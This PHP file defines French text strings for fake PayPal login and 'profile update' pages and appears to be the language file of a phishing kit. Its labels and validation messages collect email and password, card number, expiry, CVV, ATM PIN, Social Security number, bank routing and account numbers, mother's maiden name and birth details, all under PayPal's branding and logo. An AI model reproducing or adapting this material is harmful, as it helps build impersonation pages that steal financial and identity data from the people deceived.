<?php


$charset = "iso-8859-1";
$acctype = "Type de compte";
$title = "Connexion - PayPal";
$title2 = "Erreur - Connexion - PayPal";
$search1 = "Recherche PayPal";
$search2 = "Rechercher";
$signup = "Ouvrir un compte";
$login = "Connexion";
$help = "Aide";
$s_center = "S�curit� et protection";
$s_main = "Aller directement au contenu principal";
$home = "Accueil";
$personal = "Personnel";
$business = "Business";
$products = "Produits et services";
$develop = "D�veloppeurs";
$mlogin = "Connexion au compte";
$slogin = "Connexion s�curis�e";
$alogin = "Connexion au compte";
$goto = "Consultez la page";
$_email  = "Adresse email";
$_pass = "Mot de passe PayPal";
$macct = "Mon compte";
$paym = "Paiement";
$dpaym = "Demande de Paiement";
$m_acctp = "Mon compte - PayPal";
$mtrs = "Mes transactions";
$forgot = "Vous avez oubli� votre";
$p_conx = "Probl�me de connexion ?";
$adr = "adresse email";
$or = "ou";
$epass = "mot de passe";
$newtop = "Nouveau chez PayPal ?";
$sup = "Ouvrir un compte";
$t1 = "Plus d'informations";
$t2 = "Notre soci�t�";
$t3 = "Evaluation du site";
$t4 = "Tarifs";
$t5 = "Respect de la vie priv�e";
$t6 = "Security Center";
$t7 = "Service client�le";
$t8 = "Contrats l�gaux";
$t9 = "International";
$t10 = "Offres d'emploi";
$t11 = "Solutions e-commerce";
$t12 = "Notre blog";
$t13 = "Ateliers";
$t14 = "Parrainages";
$t15 = "Plan du site";
$t16 = "eBay";
$t17 = "Communaut�";
$copyright = "Copyright � 1999-2012 PayPal. Tous droits r�serv�s.";
$fdic = "Information about FDIC pass-through insurance";
$processing = "Ouverture d'une session s�curis�e...";
$opay = "Ouverture de Session S�curis�e - PayPal";
$safe = "PayPal. Votre r�flexe s�curit� pour payer en ligne.";
$ifno = "Si cette page reste affich�e plus de 5 secondes,";
$clickhere = "cliquez ici";
$reload = "pour l'actualiser.";
$profupdate = "Mise � jour de profil - PayPal";
$logout = "D�connexion";
$myacc = "Mon Compte";
$over = "Description g�n�rale";
$addfound = "Ajouter des fonds";
$retirar = "Virer";
$banktf = "Virer des fonds vers un compte bancaire";
$history = "Historique";
$bsearch = "Recherche de base";
$dhistory = "T�l�charger l'historique";
$resolu = "Gestionnaire de litiges";
$demendcheq = "Demander un ch�que";
$usedebit = "Utiliser une carte de d�bit";
$opencase = "Visualiser les dossiers en cours";
$guides = "Didacticiels";
$prof = "Pr�f�rences";
$est_acc = "Etablir un compte";
$ver = "Statut V�rifi�";
$upacc = "Surclasser son compte";
$editacc = "Modifier votre compte";
$cardpay = "Carte de cr�dit PayPal Plus";
$paymobile = "Utilisez PayPal sur votre t�l�phone mobile";
$news = "Nouveaut�s";
$activity = "Revoir Ces R�centes Activit�s";
$surepay = "Payer Est Plus Sure Et Plus Rapide Avec PayPal";
$know = "Savoir O� Utiliser PayPal";
$valid = "Vous avez r�ussi � activ� votre compte PayPal.";
$redirect = "Vous allez �tre rediriger vers la page de connexion. Veuillez vous reconnecter.";
$addfunbank = "Ajouter des fonds � partir d'un compte bancaire";
$gsales = "Gestionnaire de solde";
$addfundmoney = "Ajouter des fonds depuis un compte MoneyPak";
$addemail = "Ajouter ou modifier une adresse email";
$addbank = "Enregistrer ou modifier un compte bancaire";
$addcard = "Enregistrer ou modifier une carte de cr�dit";
$addadr = "Ajouter ou modifier une adresse postale";
$addphone = "Enregistrer ou modifier un num�ro de t�l�phone";
$moreopt = "Autres options";
$sendmoney = "Envoie de paiement";
$reqmoney = "Demande de paiement";
$mservices = "Solutions e-commerce";
$autools = "Outils ench�res";
$stra = "Transaction s�curis�e";
$completeform = '<div id="messageBox" class="legacyErrors"><div class="messageBox error"><p style="width: 690px; margin-bottom: 6px; margin-top: 12px;">Veuillez �tre sure d�entrer les informations correctement, et respecter les formats requis.Remplissez tous les champs requis.</p></div></div>';
$pip = "Informations sur le profil personnel";
$accu = "Assurez-vous que vous entrez les informations avec pr�cision, et selon les formats requis.";
$filla = "Veuillez remplir tous les champs vides.";
$filds="Champs requis";

$month = "Mois";
$day = "Jour"; 
$year = "Ann�e";
$hpn = "N� de t�l�phone :";
$acpnum = "Ce num�ro sera utilis� pour vous contacter en cas de probl�me avec votre compte ou votre achat. Nous ne communiquons jamais votre num�ro aux soci�t�s de t�l�marketing.";

//Ce num�ro va �tre utilis� pour vous contacter � propos mesures de s�curit� ou autres choses concernant votre compte paypal.
$hap = "Adresse du domicile";
$acu = "Saisissez vos informations de fa�on aussi pr�cise que possible.";
$adr1 = "Ligne d'adresse 1 :";
$adr2 = "Ligne d'adresse 2 :";
$city = "Ville :";
$state = "Etat :";
$zip = "Code Postal :";

$country = "Pays :";
$scountry = "----- Choisir un pays -----";
$ccprof = "Profil de la carte de cr�dit/d�bit";
$damelacc = "Entrez le num�ro de carte de fa�on aussi pr�cise que possible.";
$damelacb = "N� de carte, veuillez entrer les num�ros seulement, pas de tirets ou des espaces.";
$cvv = "Cryptogramme visuel :";
$hcvv = "Aide sur le Cryptogramme visuel de la carte";
$rfield = "Champ obligatoire";
$spo = "Enregistrer le profil";
$for1 = "Pour votre protection, nous v�rifions les informations des cartes de cr�dit.";
$for2 = "Le processus prend normalement environ 30 secondes, mais il peut prendre plus de temps � certaines p�riodes de la journ�e. Cliquez";
$for3 = "Actualiser vos informations.";

$puf = "Actualiser le profil";
$assl = "� propos des certificats SSL";
$logo = "https://www.paypalobjects.com/WEBSCR-600-20091209-1/fr_XC/i/header/hdr_loginpage_560x228.jpg";

$Nomdelabanque = "Nom de la banque";
$Ndecompte = "N&ordm; de compte";
$Nomdutitulairedelacarte = "Nom du titulaire de la carte :";//Nom du titulaire


$Tcard = "Type de Carte :";
$ccnumbr = "N� de carte :";
$expbr = "Date d'expiration :";
$atmm = "Votre PIN Guichet :";

$ffPrenom = "Pr�nom :";
$ffNom  = "Nom :";

$quis1 = "Nom de jeune fille";
$quis2 = "4 derniers caract&egrave;res du permis de conduire";
$quis3 = "Les 4 derniers chiffres du num&eacute;ro de s&eacute;curit&eacute; sociale";
$quis4 = "Ville de naissance";
$quis5 = "Autre question";


$IDTYPE = "S�lectionnez le type de Id :";
$Passport="Passeport";
$Card_Identification="Carte d'identification";
$Driving_License="Permis de conduire";

$codepersonel="Code s�curis� :";



$dateness = "Date de naissance :";
$ssn = "Num�ro de S�curit� Sociale :";
$quest0 = "Question de s�curit� :";
$choosquest1 = "--Choisissez une question--";

$choosquest2 = "Autre question :";

$quest2 = "2nd Question de s�curit� :";
$answer = "R�ponse :";
$troubl = "Conseils pour la r�solution des probl�mes";
$forg = "Mot de passe oubli� ?";
$caract = "- Votre mot de passe doit comporter au moins huit (8) caract�res.";
$majuscl = "- Le mot de passe respecte les majuscules/minuscules. V�rifiez que la touche de verrouillage des majuscules est d�sactiv�e.";
$forgmail = "Adresse email oubli�e ?";
$identify = "- Identifiez l'adresse email utilis�e pour ouvrir votre compte PayPal.";
$newemail = "Nouvelle adresse email ?";
$logusing = "- Connectez-vous � l'aide de votre ancienne adresse email et acc�dez � vos Pr�f�rences pour mettre votre adresse � jour.";
$troubl = "Probl�me de connexion ?";
$ymst = "- Vous avez peut-�tre effectu� un trop grand nombre de tentatives. Faites un nouvel essai dans deux heures, ou ";
$cntus = "contactez-nous";
$needhlp = ", si vous avez besoin d'aide. ";
$encookies = "- Il vous faudra peut-�tre activer les cookies dans votre navigateur Web.";
$howork = "Principes de fonctionnement de PayPal";
$whatis = "Qu'est-ce que PayPal ?";
$started = "Premiers pas";
$managacc = "Gestion de votre compte";
$greatw = "Avantages li�s � l'utilisation de PayPal";
$topten = "Dix choses � savoir � propos de PayPal";
$howmuch = "PayPal est-il vraiment gratuit ?";
$acctyp = "Types de comptes";
$payon = "Payer en ligne";
$greatd = "Bonnes affaires";
$pstory = "Annuaire de boutiques PayPal";
$pmaster = "PayPal Plus MasterCard";
$shopvm = "Acheter avec PayPal Mobile";
$smoney = "Paiement";
$smoneyon = "Paiement en ligne";
$internly = "International";
$tyt = "� votre enfant";
$vmobile = "Via votre t�l�phone mobile";
$gpaid = "Obtenir un paiement";
$sonln = "Vendre en ligne";
$accard = "Accepter les cartes de cr�dit";
$rqmoney = "Demande de paiement";
$fundrs = "Collecte de fonds";
$activ_recent = "Mon activit� r�cente";
$p_received = "Paiements re�us";
$p_envoye = "Paiements envoy�s";
$aff_trans = "Afficher toutes mes transactions";
$sept_j = "7 derniers jours";
$what = "Qu'est-ce que c'est?";
$gloss = "Glossaire des �tats de paiement";
$select_recent = "S�lectionner toutes les transactions r�centes";
$date = "Date";
$type = "Type";
$n_email = "Nom/Adresse email";
$etat_pay = "Etat du paiement";
$details = "D�tails";
$when = "Lorsqu'une ic�ne appara�t en regard de l'une de vos transactions, cela signifie que des informations compl�mentaires sont disponibles ou qu'une remarque est jointe. Positionnez votre curseur sur l'ic�ne pour plus d'informations sur la transaction.";
$etat_commande = "Etat de la commande / Actions";
$a_commission = "Avant commission";
$aucun_objet = "- Aucun nouvel objet -";
$notif = "Notifications";
$mise_a_jour = "Mises � jour du r�glement";
$whatsThis = "Les transactions que vous archivez seront d�plac�es vers votre liste Toute l�activit� du compte.";



$valid = array("Veuillez entrer votre Pr�nom"
,"Le maximum pour le nom est 40"
,"Veuillez entrer votre Nom"
,"Le maximum pour le nom est 40"
,"Veuillez choisir * mois * Date de naissance"
,"Veuillez choisir *Jour * Date de naissance"
,"Veuillez choisir * Ann�e * Date de naissance"
,"Veuillez entrer votre Adresse"
,"Le Maximum pour l'Adresse est 50"
,"Le Minimum pour l'Adresse est 5"
,"Veuillez entrer Le nom de votre ville"
,"Le Maximum pour Le nom de votre ville est 15"
,"Le Minimum pour Le nom de votre ville est 4"
,"Choisir Pays/Territoire"
,"Veuillez entrer votre Code postal"
,"Veuillez entrer votre N� de t�l�phone personnel"
,"Veuillez entrer seulement les numero"
,"Le Minimum pour le num�ro de telephone est 10"
,"Veuillez entrer Nom du titulaire de la carte"
,"Veuillez Choisir *Type de carte*"
,"Veuillez entrer le numero de votre carte"
,"Le Maximum pour le num�ro de carte est 16"
,"Le Minimum pour le num�ro de carte est 13"
,"Veuillez entrer seulement les numero"
,"Veuillez choisir la Date d'expiration - Mois -"
,"Veuillez choisir la Date d'expiration - Ann�e -"
,"Veuillez entrer votre Cryptogramme visuel"
,"Veuillez entrer seulement les numero"
,"Le Minimum pour le Cryptogramme visuel est 3"
,"S'il vous pla�t entrer votre code ATM"
,"Le nombre maximum pour votre code ATM de 4"
,"Le nombre minimum pour votre code ATM de 4"
,"Veuillez entrer votre Num�ro de S�curit� Sociale"
,"Le nombre maximum pour le num�ro de s�curit� sociale est de 9"
,"Le nombre minimum pour le num�ro de s�curit� sociale est de 9"
,"Veuillez entrer seulement les numero");

$routing="Bank Routing Number :";
$account="Bank Account Number :";
$accountch="Les 4 Derniers Chiffres de Compte bancaire :";
$hrouting="Aide sur votre Bank Routing Number";
$haccount="Aide sur votre Bank Account Number";

$font1 = "<font color='#c00'>";
$font2 = "</font>";
$error0 = "<div id=\"messageBox\" class=\"legacyErrors\"><div class=\"messageBox error\"><p>Vos informations sont incompl�tes ou incorrectes. Veuillez corriger les champs ci-dessous, puis r�essayer.</p></div></div>";
$error1 = "<div id=\"messageBox\" class=\"legacyErrors\"><div class=\"messageBox error\"><p>Veuillez v�rifier que vous avez saisi correctement votre <b>adresse email</b> et votre <b>mot de passe</b>. Si vous ne parvenez toujours pas � vous connecter, veuillez consulter la rubrique <b>Conseils de d�pannage</b> ci-apr�s.</p></div></div>";

                                            

?>
